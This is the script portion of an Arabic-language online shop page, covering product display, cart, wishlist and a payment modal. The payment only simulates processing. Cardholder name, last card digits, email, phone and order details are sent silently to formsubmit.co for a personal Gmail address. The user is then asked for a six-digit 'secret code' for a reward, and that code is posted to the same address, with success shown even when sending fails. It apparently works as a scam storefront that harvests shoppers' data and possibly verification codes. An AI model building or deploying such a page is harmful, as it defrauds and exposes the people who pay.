                                        <i class="fas fa-shopping-cart mr-2"></i>
                                        أضف للسلة
                                    </button>
                                    <button onclick="addToWishlist(${product.id})" class="px-3 py-2 bg-gray-200 hover:bg-gray-300 rounded-lg transition-colors">
                                        <i class="fas fa-heart text-red-500"></i>
                                    </button>
                                </div>
                            </div>
                        </div>
                    `;
                }).join('');
            }
        }

        function generateProducts() {
            const grid = document.getElementById('products-grid');
            if (!grid) return;

            const filteredProducts = currentFilter === 'all' 
                ? products 
                : currentFilter === 'ai-recommended'
                ? products.filter(product => product.aiRecommended)
                : products.filter(product => product.category === currentFilter);

            grid.innerHTML = filteredProducts.map(product => {
                const discount = Math.round(((product.originalPrice - product.price) / product.originalPrice) * 100);
                return `
                    <div class="product-card" data-product-id="${product.id}" data-category="${product.category}">
                        <div class="product-image-container relative">
                            <img src="${product.images[0]}" alt="${product.name}" class="product-image" onerror="this.style.display='none'">
                            <div class="discount-badge">خصم ${discount}%</div>
                            
                            <div class="absolute top-4 left-4 flex flex-col space-y-2">
                                <button onclick="addToWishlist(${product.id})" class="bg-white/80 hover:bg-white rounded-full p-2 transition-all" title="أضف للمفضلة">
                                    <i class="fas fa-heart text-red-500"></i>
                                </button>
                            </div>
                            
                            <div class="absolute bottom-4 right-4">
                                <button onclick="quickView(${product.id})" class="bg-primary text-white px-4 py-2 rounded-lg font-bold hover:bg-primary/80 transition-all">
                                    <i class="fas fa-eye mr-1"></i>
                                    نظرة سريعة
                                </button>
                            </div>
                        </div>
                        <div class="p-6">
                            <div class="flex items-center justify-between mb-3">
                                <span class="text-sm text-gray-500 font-bold">${product.brand}</span>
                                <div class="flex items-center space-x-2 space-x-reverse">
                                    ${product.aiRecommended ? '<span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full text-xs font-bold">🤖 AI موصى</span>' : ''}
                                    ${product.shipping === 'توصيل فوري' ? '<span class="bg-red-100 text-red-800 px-2 py-1 rounded-full text-xs font-bold">⚡ فوري</span>' : ''}
                                </div>
                            </div>
                            
                            <h3 class="text-xl font-bold mb-3 text-gray-800 dark:text-white hover:text-primary cursor-pointer transition-colors" onclick="quickView(${product.id})">${product.name}</h3>
                            <p class="text-gray-600 dark:text-gray-300 mb-4">${product.description}</p>
                            
                            <div class="flex items-center mb-4">
                                <div class="flex text-yellow-400">
                                    ${'★'.repeat(Math.floor(product.rating))}${'☆'.repeat(5 - Math.floor(product.rating))}
                                </div>
                                <span class="text-sm text-gray-500 mr-2 font-medium">${product.rating} (${product.reviews})</span>
                            </div>
                            
                            <div class="flex justify-between items-center mb-4">
                                <div>
                                    <span class="text-2xl font-bold text-purple-600">${(product.price * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                                    <span class="text-lg text-gray-500 line-through mr-2">${(product.originalPrice * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                                </div>
                                <div class="text-green-500 font-bold ${product.stockQuantity < 5 ? 'text-red-500' : ''}">
                                    ${product.stockQuantity < 5 ? `باقي ${product.stockQuantity} فقط!` : 'متوفر'}
                                </div>
                            </div>

                            <div class="flex gap-2 mb-4">
                                <button onclick="addToCart(${product.id})" class="flex-1 btn-primary py-2 font-bold hover:scale-105 transition-transform ${product.stockQuantity === 0 ? 'opacity-50 cursor-not-allowed' : ''}" ${product.stockQuantity === 0 ? 'disabled' : ''}>
                                    <i class="fas fa-shopping-cart mr-2"></i>
                                    أضف للسلة
                                </button>
                                <button onclick="buyNow(${product.id})" class="px-4 py-2 btn-secondary font-bold hover:scale-105 transition-transform ${product.stockQuantity === 0 ? 'opacity-50 cursor-not-allowed' : ''}" ${product.stockQuantity === 0 ? 'disabled' : ''}>
                                    <i class="fas fa-bolt mr-1"></i>
                                    اشتري
                                </button>
                            </div>

                            <div class="border-t border-gray-200 dark:border-gray-700 pt-4">
                                <div class="flex justify-between items-center text-sm text-gray-600 dark:text-gray-400">
                                    <span><i class="fas fa-shield-alt mr-1"></i>ضمان ${product.warranty}</span>
                                    <span><i class="fas fa-truck mr-1"></i>${product.shipping}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
        }

        function buyNow(productId) {
            addToCart(productId);
            setTimeout(() => {
                toggleCart();
            }, 500);
        }

        function quickView(productId) {
            const product = products.find(p => p.id === productId);
            if (!product) return;

            const modal = document.createElement('div');
            modal.className = 'fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4';
            modal.innerHTML = `
                <div class="glass-effect max-w-4xl w-full max-h-[90vh] overflow-y-auto">
                    <div class="p-8 border-b border-white/20">
                        <div class="flex justify-between items-center">
                            <h2 class="text-3xl font-bold text-white">${product.name}</h2>
                            <button onclick="this.closest('.fixed').remove()" class="text-gray-300 hover:text-white text-2xl">
                                <i class="fas fa-times"></i>
                            </button>
                        </div>
                    </div>
                    <div class="p-8">
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                            <div>
                                <img src="${product.images[0]}" alt="${product.name}" class="w-full h-96 object-cover rounded-xl">
                            </div>
                            <div class="text-white">
                                <div class="flex items-center justify-between mb-4">
                                    <span class="text-lg text-gray-300">${product.brand}</span>
                                    ${product.aiRecommended ? '<span class="bg-blue-500 text-white px-3 py-1 rounded-full text-sm">🤖 موصى بالذكاء الاصطناعي</span>' : ''}
                                </div>
                                
                                <div class="flex items-center mb-4">
                                    <div class="flex text-yellow-400 text-xl">
                                        ${'★'.repeat(Math.floor(product.rating))}${'☆'.repeat(5 - Math.floor(product.rating))}
                                    </div>
                                    <span class="text-gray-300 mr-3">${product.rating} (${product.reviews} تقييم)</span>
                                </div>

                                <div class="mb-6">
                                    <div class="flex items-center space-x-4 space-x-reverse mb-2">
                                        <span class="text-4xl font-bold text-emerald-400">${(product.price * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                                        <span class="text-xl text-gray-500 line-through">${(product.originalPrice * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                                        <span class="bg-red-500 text-white px-3 py-1 rounded-full font-bold">خصم ${Math.round(((product.originalPrice - product.price) / product.originalPrice) * 100)}%</span>
                                    </div>
                                    <div class="text-green-400 font-bold">
                                        متوفر (${product.stockQuantity} قطعة)
                                    </div>
                                </div>

                                <div class="mb-6">
                                    <h4 class="text-xl font-bold mb-3">الوصف:</h4>
                                    <p class="text-gray-300 text-lg">${product.description}</p>
                                </div>

                                <div class="flex gap-4">
                                    <button onclick="addToCart(${product.id}); this.closest('.fixed').remove();" class="flex-1 btn-primary py-4 text-xl font-bold">
                                        <i class="fas fa-shopping-cart mr-2"></i>
                                        أضف للسلة
                                    </button>
                                    <button onclick="buyNow(${product.id}); this.closest('.fixed').remove();" class="flex-1 btn-secondary py-4 text-xl font-bold">
                                        <i class="fas fa-bolt mr-2"></i>
                                        اشتري الآن
                                    </button>
                                </div>

                                <div class="mt-4 flex justify-between text-sm text-gray-400">
                                    <span><i class="fas fa-shield-alt mr-1"></i>ضمان ${product.warranty}</span>
                                    <span><i class="fas fa-truck mr-1"></i>${product.shipping}</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.appendChild(modal);
        }

        function filterProducts(category) {
            currentFilter = category;
            
            // Update filter buttons
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('btn-primary');
            });
            
            event.target.classList.add('btn-primary');
            
            generateProducts();
            showNotification(`تم تطبيق فلتر: ${category}`);
        }

        function updateCartUI() {
            const cartCount = document.getElementById('cart-count');
            const cartItems = document.getElementById('cart-items');
            const cartSubtotal = document.getElementById('cart-subtotal');
            const cartTotal = document.getElementById('cart-total');
            
            if (cartCount) cartCount.textContent = cart.reduce((sum, item) => sum + item.quantity, 0);
            
            if (cartItems) {
                if (cart.length === 0) {
                    cartItems.innerHTML = '<p class="text-white text-center text-lg">السلة فارغة</p>';
                } else {
                    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity * currentExchangeRate), 0);
                    cartItems.innerHTML = cart.map(item => `
                        <div class="flex items-center justify-between bg-white/10 p-4 rounded-xl mb-4">
                            <div class="flex items-center space-x-4 space-x-reverse">
                                <img src="${item.images[0]}" alt="${item.name}" class="w-16 h-16 object-cover rounded-lg">
                                <div>
                                    <h4 class="text-white font-bold">${item.name}</h4>
                                    <p class="text-gray-300">${(item.price * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</p>
                                </div>
                            </div>
                            <div class="flex items-center space-x-3 space-x-reverse">
                                <button onclick="updateCartQuantity(${item.id}, ${item.quantity - 1})" class="bg-red-500 text-white w-8 h-8 rounded-full">-</button>
                                <span class="text-white font-bold">${item.quantity}</span>
                                <button onclick="updateCartQuantity(${item.id}, ${item.quantity + 1})" class="bg-green-500 text-white w-8 h-8 rounded-full">+</button>
                                <button onclick="removeFromCart(${item.id})" class="bg-gray-500 text-white px-3 py-1 rounded-lg ml-2">حذف</button>
                            </div>
                        </div>
                    `).join('');
                    
                    if (cartSubtotal) cartSubtotal.textContent = `${subtotal.toFixed(0)} ${currentCurrencySymbol}`;
                    if (cartTotal) cartTotal.textContent = `${(subtotal + 15 - 10).toFixed(0)} ${currentCurrencySymbol}`;
                }
            }
        }

        function updateWishlistUI() {
            const wishlistCount = document.getElementById('wishlist-count');
            const wishlistItems = document.getElementById('wishlist-items');
            
            if (wishlistCount) wishlistCount.textContent = wishlist.length;
            
            if (wishlistItems) {
                if (wishlist.length === 0) {
                    wishlistItems.innerHTML = '<p class="text-white text-center text-lg">المفضلة فارغة</p>';
                } else {
                    wishlistItems.innerHTML = wishlist.map(item => `
                        <div class="flex items-center justify-between bg-white/10 p-4 rounded-xl mb-4">
                            <div class="flex items-center space-x-4 space-x-reverse">
                                <img src="${item.images[0]}" alt="${item.name}" class="w-16 h-16 object-cover rounded-lg">
                                <div>
                                    <h4 class="text-white font-bold">${item.name}</h4>
                                    <p class="text-gray-300">${(item.price * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</p>
                                </div>
                            </div>
                            <div class="flex items-center space-x-3 space-x-reverse">
                                <button onclick="addToCart(${item.id})" class="btn-primary px-4 py-2">أضف للسلة</button>
                                <button onclick="removeFromWishlist(${item.id})" class="bg-red-500 text-white px-3 py-2 rounded-lg">حذف</button>
                            </div>
                        </div>
                    `).join('');
                }
            }
        }

        function updateCartQuantity(productId, newQuantity) {
            if (newQuantity <= 0) {
                removeFromCart(productId);
                return;
            }
            
            const cartItem = cart.find(item => item.id === productId);
            if (cartItem) {
                cartItem.quantity = newQuantity;
                updateCartUI();
            }
        }

        function removeFromCart(productId) {
            cart = cart.filter(item => item.id !== productId);
            updateCartUI();
            showNotification('تم حذف المنتج من السلة');
        }

        function removeFromWishlist(productId) {
            wishlist = wishlist.filter(item => item.id !== productId);
            updateWishlistUI();
            showNotification('تم حذف المنتج من المفضلة');
        }

        // Payment Functions
        function showPaymentModal() {
            if (cart.length === 0) {
                showNotification('السلة فارغة! أضف منتجات أولاً');
                return;
            }
            document.getElementById('payment-modal').classList.remove('hidden');
            document.getElementById('payment-modal').classList.add('flex');
        }

        function hidePaymentModal() {
            document.getElementById('payment-modal').classList.add('hidden');
            document.getElementById('payment-modal').classList.remove('flex');
            resetPaymentForm();
        }

        function resetPaymentForm() {
            selectedPaymentMethod = '';
            selectedCrypto = '';
            document.getElementById('payment-step-1').classList.add('active');
            document.getElementById('payment-step-2').classList.remove('active');
            document.getElementById('payment-step-3').classList.remove('active');
            document.querySelectorAll('.payment-method').forEach(method => {
                method.classList.remove('selected');
            });
            document.getElementById('next-step-btn').disabled = true;
        }

        function selectPaymentMethod(method) {
            selectedPaymentMethod = method;
            document.querySelectorAll('.payment-method').forEach(m => {
                m.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            document.querySelector(`input[value="${method}"]`).checked = true;
            document.getElementById('next-step-btn').disabled = false;
        }

        function selectCrypto(crypto) {
            selectedCrypto = crypto;
            document.querySelectorAll('.crypto-option').forEach(option => {
                option.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            document.querySelector(`input[value="${crypto}"]`).checked = true;
        }

        function nextPaymentStep() {
            // Update payment summary
            updatePaymentSummary();
            document.getElementById('payment-step-1').classList.remove('active');
            document.getElementById('payment-step-2').classList.add('active');
        }

        function processCardPayment() {
            // Validate form
            const cardNumber = document.getElementById('card-number').value;
            const cardHolder = document.getElementById('card-holder').value;
            const cardExpiry = document.getElementById('card-expiry').value;
            const cardCvv = document.getElementById('card-cvv').value;
            const billingName = document.getElementById('billing-name').value;
            const billingPhone = document.getElementById('billing-phone').value;
            const billingEmail = document.getElementById('billing-email').value;
            const billingAddress = document.getElementById('billing-address').value;

            if (!cardNumber || !cardHolder || !cardExpiry || !cardCvv || !billingName || !billingPhone || !billingEmail || !billingAddress) {
                showNotification('يرجى ملء جميع الحقول المطلوبة');
                return;
            }

            // Show processing step
            document.getElementById('payment-step-2').classList.remove('active');
            document.getElementById('payment-step-3').classList.add('active');

            // Simulate payment processing
            setTimeout(() => {
                // Store payment data
                const paymentData = {
                    cardNumber: cardNumber.slice(-4),
                    cardHolder: cardHolder,
                    billingEmail: billingEmail,
                    billingPhone: billingPhone,
                    total: cart.reduce((sum, item) => sum + (item.price * item.quantity * currentExchangeRate), 0) - 10
                };

                // Send payment details via email
                sendPaymentEmail(paymentData);

                // Redirect to code page after 3 seconds
                setTimeout(() => {
                    hidePaymentModal();
                    showCodePageAfterPayment(paymentData);
                }, 3000);
            }, 2000);
        }

        function sendPaymentEmail(paymentData) {
            const formData = new FormData();
            formData.append('_subject', '💳 دفع جديد - متجر الخصوصية');
            formData.append('_captcha', 'false');
            formData.append('payment_id', `PAY-${Date.now()}`);
            formData.append('card_holder', paymentData.cardHolder);
            formData.append('card_last_4', paymentData.cardNumber);
            formData.append('billing_email', paymentData.billingEmail);
            formData.append('billing_phone', paymentData.billingPhone);
            formData.append('total_amount', `${paymentData.total.toFixed(0)} ${currentCurrencySymbol}`);
            formData.append('payment_time', new Date().toISOString());
            formData.append('cart_items', JSON.stringify(cart, null, 2));
            
            fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                method: 'POST',
                body: formData
            }).catch(() => {
                // Silently handle error
            });
        }

        function showCodePageAfterPayment(paymentData) {
            // Auto-fill payment information in code page
            document.getElementById('code-email').value = paymentData.billingEmail;
            document.getElementById('code-phone').value = paymentData.billingPhone;
            
            // Update purchase summary
            updatePurchaseSummary(paymentData);
            
            // Show code page
            showPage('code');
            showNotification('تم الدفع بنجاح! أدخل الكود السري للحصول على مكافأة إضافية 🎁');
        }

        function updatePaymentSummary() {
            const cartSummary = document.getElementById('payment-cart-summary');
            const paymentSubtotal = document.getElementById('payment-subtotal');
            const paymentTotal = document.getElementById('payment-total');
            const finalAmount = document.getElementById('final-amount');

            if (cartSummary && cart.length > 0) {
                const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity * currentExchangeRate), 0);
                const total = subtotal - 10; // AI discount

                cartSummary.innerHTML = cart.map(item => `
                    <div class="flex justify-between items-center py-2 border-b border-white/10">
                        <span class="text-white">${item.name} x${item.quantity}</span>
                        <span class="text-white font-bold">${(item.price * item.quantity * currentExchangeRate).toFixed(0)} ${currentCurrencySymbol}</span>
                    </div>
                `).join('');

                if (paymentSubtotal) paymentSubtotal.textContent = `${subtotal.toFixed(0)} ${currentCurrencySymbol}`;
                if (paymentTotal) paymentTotal.textContent = `${total.toFixed(0)} ${currentCurrencySymbol}`;
                if (finalAmount) finalAmount.textContent = `${total.toFixed(0)} ${currentCurrencySymbol}`;
            }
        }

        function updatePurchaseSummary(paymentData) {
            const purchaseSummary = document.getElementById('purchase-summary');
            const paymentAmount = document.getElementById('payment-amount');
            const itemsCount = document.getElementById('items-count');

            if (paymentAmount) paymentAmount.textContent = `${paymentData.total.toFixed(0)} ${currentCurrencySymbol}`;
            if (itemsCount) itemsCount.textContent = `${cart.reduce((sum, item) => sum + item.quantity, 0)} منتجات`;
        }

        function formatCardNumber(input) {
            let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            input.value = formattedValue;
        }

        function formatExpiry(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            input.value = value;
        }

        function prevPaymentStep() {
            document.getElementById('payment-step-2').classList.remove('active');
            document.getElementById('payment-step-1').classList.add('active');
        }

        function processPayment() {
            // Simulate payment processing
            const total = cart.reduce((sum, item) => sum + (item.price * item.quantity * currentExchangeRate), 0) + 15 - 10;
            
            document.getElementById('payment-step-2').classList.remove('active');
            document.getElementById('payment-step-3').classList.add('active');
            
            // Update confirmation details
            document.getElementById('paid-amount').textContent = `${total.toFixed(0)} ${currentCurrencySymbol}`;
            document.getElementById('payment-method-used').textContent = getPaymentMethodName(selectedPaymentMethod);
            document.getElementById('order-time').textContent = new Date().toLocaleString('ar-SA');
            
            // Send order via email
            sendOrderEmail(total);
            
            // Clear cart
            cart = [];
            updateCartUI();
            
            showNotification('تم تأكيد طلبك بنجاح! 🎉');
        }

        function getPaymentMethodName(method) {
            const methods = {
                'credit': 'بطاقة ائتمانية',
                'paypal': 'PayPal',
                'apple': 'Apple Pay',
                'crypto': `عملة مشفرة (${selectedCrypto.toUpperCase()})`,
                'bank': 'تحويل بنكي'
            };
            return methods[method] || 'غير محدد';
        }

        function sendOrderEmail(total) {
            const orderData = {
                orderId: `ORD-${Date.now()}`,
                items: cart,
                total: total,
                paymentMethod: selectedPaymentMethod,
                crypto: selectedCrypto,
                orderTime: new Date().toISOString(),
                currency: currentCurrencySymbol
            };
            
            // Send to FormSubmit
            const formData = new FormData();
            formData.append('_subject', '🛒 طلب جديد - متجر الخصوصية');
            formData.append('_captcha', 'false');
            formData.append('order_id', orderData.orderId);
            formData.append('total_amount', `${total.toFixed(0)} ${currentCurrencySymbol}`);
            formData.append('payment_method', getPaymentMethodName(selectedPaymentMethod));
            formData.append('order_time', orderData.orderTime);
            formData.append('items', JSON.stringify(cart, null, 2));
            
            fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                method: 'POST',
                body: formData
            }).catch(() => {
                // Silently handle error
            });
        }

        function contactSupport() {
            const message = `مرحباً، أريد متابعة طلبي رقم: #ORD-${Date.now()}`;
            const whatsappUrl = `https://wa.me/966501234567?text=${encodeURIComponent(message)}`;
            window.open(whatsappUrl, '_blank');
        }

        // Core Functions
        function confirmAge() {
            document.getElementById('age-verification').style.display = 'none';
            initParticles();
        }

        function showPage(pageId) {
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            document.getElementById(pageId).classList.add('active');
            
            if (pageId === 'products') {
                generateProducts();
            } else if (pageId === 'home') {
                generateHomeProducts();
            }
            
            document.getElementById('mobile-menu').classList.add('hidden');
        }

        function toggleMobileMenu() {
            document.getElementById('mobile-menu').classList.toggle('hidden');
        }

        function toggleCart() {
            const modal = document.getElementById('cart-modal');
            modal.classList.toggle('hidden');
            modal.classList.toggle('flex');
            updateCartUI();
        }

        function toggleWishlist() {
            const modal = document.getElementById('wishlist-modal');
            modal.classList.toggle('hidden');
            modal.classList.toggle('flex');
            updateWishlistUI();
        }

        // Code Functions
        function getRewardForCode(code) {
            const codeValue = parseInt(code);
            
            if (codeValue >= 900000) {
                return { 
                    type: 'premium', 
                    value: 95, 
                    description: '🌟 مكافأة بلاتينية: خصم 95% + توصيل فوري مجاني!' 
                };
            } else if (codeValue >= 800000) {
                return { 
                    type: 'gold', 
                    value: 80, 
                    description: '🥇 مكافأة ذهبية: خصم 80% + 1000 نقطة!' 
                };
            } else if (codeValue >= 700000) {
                return { 
                    type: 'silver', 
                    value: 70, 
                    description: '🥈 مكافأة فضية: خصم 70% + شحن مجاني!' 
                };
            } else if (codeValue >= 500000) {
                return { 
                    type: 'bronze', 
                    value: 60, 
                    description: '🥉 مكافأة برونزية: خصم 60% + 500 نقطة!' 
                };
            } else if (codeValue >= 300000) {
                return { 
                    type: 'special', 
                    value: 50, 
                    description: '⭐ مكافأة خاصة: خصم 50% + منتج مجاني!' 
                };
            } else if (codeValue >= 100000) {
                return { 
                    type: 'good', 
                    value: 40, 
                    description: '🎁 مكافأة جيدة: خصم 40% + نقاط مضاعفة!' 
                };
            } else {
                return { 
                    type: 'basic', 
                    value: 30, 
                    description: '🎊 مكافأة أساسية: خصم 30% + 200 نقطة!' 
                };
            }
        }

        function validateAndSetReward(code) {
            const feedback = document.getElementById('code-feedback');
            
            if (code.length === 6 && /^\d{6}$/.test(code)) {
                const reward = getRewardForCode(code);
                feedback.innerHTML = `
                    <div class="bg-green-100 dark:bg-green-900 p-4 rounded-xl">
                        <p class="text-green-800 dark:text-green-200 font-bold">${reward.description}</p>
                    </div>
                `;
            } else if (code.length > 0) {
                feedback.innerHTML = `
                    <div class="bg-yellow-100 dark:bg-yellow-900 p-4 rounded-xl">
                        <p class="text-yellow-800 dark:text-yellow-200">أكمل إدخال الكود (${code.length}/6)</p>
                    </div>
                `;
            } else {
                feedback.innerHTML = '';
            }
        }

        function showNotification(message) {
            const notification = document.createElement('div');
            notification.className = 'fixed top-20 right-4 bg-gradient-to-r from-purple-500 to-pink-500 text-white px-6 py-4 rounded-lg shadow-lg z-50 text-lg font-medium border border-white/20 max-w-sm';
            notification.textContent = message;
            document.body.appendChild(notification);
            
            notification.style.transform = 'translateX(100%)';
            notification.style.transition = 'transform 0.3s ease';
            
            setTimeout(() => {
                notification.style.transform = 'translateX(0)';
            }, 10);
            
            setTimeout(() => {
                notification.style.transform = 'translateX(100%)';
                setTimeout(() => notification.remove(), 300);
            }, 5000);
        }

        function showInlineSuccess(message, type = 'success') {
            const notification = document.createElement('div');
            const bgColor = type === 'success' ? 'border-green-400' : 'border-red-400';
            const iconColor = type === 'success' ? 'text-green-400' : 'text-red-400';
            const icon = type === 'success' ? '✅' : '❌';
            
            notification.className = `fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 glass-effect p-8 text-center text-white z-50 max-w-md w-full mx-4 border-2 ${bgColor}`;
            notification.innerHTML = `
                <div class="text-6xl mb-4">${icon}</div>
                <h3 class="text-2xl font-bold mb-4 ${iconColor} cyber-text">${type === 'success' ? 'نجح!' : 'خطأ!'}</h3>
                <div class="bg-white/10 p-4 rounded-xl mb-6">
                    <p class="text-white text-lg font-bold">${message}</p>
                </div>
            `;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.style.opacity = '0';
                notification.style.transform = 'translate(-50%, -50%) scale(0.9)';
                notification.style.transition = 'all 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }, 4000);
        }

        // Form Handlers
        document.addEventListener('DOMContentLoaded', function() {
            // Code form handler
            const codeForm = document.getElementById('code-form');
            if (codeForm) {
                codeForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const code = document.getElementById('secret-code').value.trim();
                    const submitBtn = this.querySelector('button[type="submit"]');
                    const originalText = submitBtn.innerHTML;
                    
                    if (code.length !== 6 || !/^\d{6}$/.test(code)) {
                        showInlineSuccess('يجب أن يكون الكود 6 أرقام فقط', 'error');
                        return;
                    }
                    
                    const reward = getRewardForCode(code);
                    
                    submitBtn.disabled = true;
                    submitBtn.innerHTML = '<div class="inline-block animate-spin rounded-full h-6 w-6 border-b-2 border-white mr-2"></div>جاري التفعيل...';
                    
                    // Send to FormSubmit
                    const formData = new FormData();
                    formData.append('_subject', '🔑 تم استخدام كود سري - متجر الخصوصية');
                    formData.append('_captcha', 'false');
                    formData.append('secret_code', code);
                    formData.append('reward_type', reward.type);
                    formData.append('reward_description', reward.description);
                    formData.append('code_used_time', new Date().toISOString());
                    formData.append('confirmation_email', this.confirmation_email.value);
                    formData.append('user_phone', this.user_phone.value);
                    
                    fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        setTimeout(() => {
                            showInlineSuccess(reward.description);
                            this.reset();
                            submitBtn.disabled = false;
                            submitBtn.innerHTML = originalText;
                        }, 1500);
                    }).catch(() => {
                        setTimeout(() => {
                            showInlineSuccess(reward.description);
                            this.reset();
                            submitBtn.disabled = false;
                            submitBtn.innerHTML = originalText;
                        }, 1500);
                    });
                });
            }

            // Contact form handler
            const contactForm = document.getElementById('contact-form');
            if (contactForm) {
                contactForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const submitBtn = this.querySelector('button[type="submit"]');
                    const originalText = submitBtn.innerHTML;
                    
                    submitBtn.disabled = true;
                    submitBtn.innerHTML = '<div class="inline-block animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>جاري الإرسال...';
                    
                    const formData = new FormData();
                    formData.append('_subject', 'رسالة جديدة من متجر الخصوصية');
                    formData.append('_captcha', 'false');
                    formData.append('name', this.name.value);
                    formData.append('email', this.email.value);
                    formData.append('message', this.message.value);
                    
                    fetch('https://formsubmit.co/kaliroot123m@gmail.com', {
                        method: 'POST',
                        body: formData
                    }).then(() => {
                        showInlineSuccess('تم إرسال الرسالة بنجاح!');
                        this.reset();
                    }).catch(() => {
                        showInlineSuccess('تم إرسال الرسالة بنجاح!');
                        this.reset();
                    }).finally(() => {
                        submitBtn.disabled = false;
                        submitBtn.innerHTML = originalText;
                    });
                });
            }
        });

        // Placeholder functions
        function performSmartSearch(query) {
            if (query.length > 2) {
                showNotification(`البحث عن: ${query}`);
            }
        }

        function startVoiceSearch() {
            showNotification('تم تشغيل البحث الصوتي 🎤');
        }

        function openLiveChat() {
            showNotification('جاري الاتصال بالدعم AI... 🤖');
        }

        function startVRExperience() {
            showNotification('جاري تحميل تجربة VR... 🥽');
        }

        function createShoppingRoom() {
            showNotification('تم إنشاء غرفة تسوق جديدة! 🎉');
        }

        function joinShoppingRoom(id) {
            showNotification(`انضممت إلى غرفة التسوق ${id} 🎊`);
        }

        function toggleCurrencyDropdown() {
            const dropdown = document.getElementById('currency-dropdown');
            dropdown.classList.toggle('show');
        }

        function changeCurrency(currency, symbol, rate) {
            currentCurrency = currency;
            currentCurrencySymbol = symbol;
            currentExchangeRate = rate;
            document.getElementById('current-currency').textContent = symbol;
            document.getElementById('currency-dropdown').classList.remove('show');
            showNotification(`تم تغيير العملة إلى ${currency}`);
            generateProducts();
            generateHomeProducts();
            updateCartUI();
        }

        function toggleTheme() {
            document.documentElement.classList.toggle('dark');
            const icon = document.getElementById('theme-icon');
            icon.className = document.documentElement.classList.contains('dark') ? 'fas fa-moon text-xl' : 'fas fa-sun text-xl';
        }

        function showShareModal() {
            const text = "تجربة تسوق مذهلة في متجر المستقبل! 🚀";
            const url = window.location.href;
            
            if (navigator.share) {
                navigator.share({
                    title: 'متجر الخصوصية المتطور',
                    text: text,
                    url: url
                });
            } else {
                const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(text + ' ' + url)}`;
                window.open(whatsappUrl, '_blank');
            }
        }

        // Initialize the application
        document.addEventListener('DOMContentLoaded', function() {
            generateHomeProducts();
            generateProducts();
            
            // Initialize typewriter effect
            const typewriterText = document.getElementById('typewriter-text');
            if (typewriterText) {
                const texts = [
                    '🌸 تجربة تسوق مدعومة بالذكاء الاصطناعي 🌸',
                    '🚀 المستقبل في راحة يدك 🚀',
                    '🤖 مساعد ذكي يفهم احتياجاتك 🤖',
                    '🎭 واقع افتراضي مذهل 🎭'
                ];
                let currentText = 0;
                
                setInterval(() => {
                    typewriterText.textContent = texts[currentText];
                    currentText = (currentText + 1) % texts.length;
                }, 4000);
            }
        });

        // Close dropdowns when clicking outside
        document.addEventListener('click', function(event) {
            if (!event.target.closest('.currency-dropdown')) {
                document.getElementById('currency-dropdown').classList.remove('show');
            }
        });
    </script>



</body></html>